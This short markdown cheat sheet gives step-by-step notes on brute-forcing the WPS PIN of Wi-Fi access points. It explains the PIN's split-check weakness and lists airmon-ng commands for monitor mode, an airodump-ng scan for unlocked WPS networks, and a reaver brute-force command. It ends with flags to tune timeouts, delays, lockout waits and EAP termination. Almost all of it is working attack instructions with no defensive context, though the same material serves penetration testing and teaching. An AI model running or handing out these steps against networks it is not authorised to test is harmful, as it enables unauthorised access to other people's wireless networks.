### WPS (Wifi Protected Setup)
```
8 digits can be bruteforced - because 4 digits are checked separately
Access Point will mostly block connection after to many requests
```

### reaver needs the interface to be in monitor mode
```
airmon-ng check kill
airmon-ng start <interface>
```

### all networks with WPS Lock options set to "no" can be attacked
```
airodump-ng <interface> --wps
```

### start brute force
```
reaver -i <interface> -b <bssid> 
```

### general information
```
default timeout value is 5 (minimum 1 second), change it with: -t <seconds>
default delay period between pin attempts is 1 second, change it with: -d <seconds>
AP will temporarily lock WPS state, reaver will wait 315 seconds, change the amount with: --lock-delay=<seconds>
if AP does not send an EAP FAIL message, force the response with: --eap-terminate
```

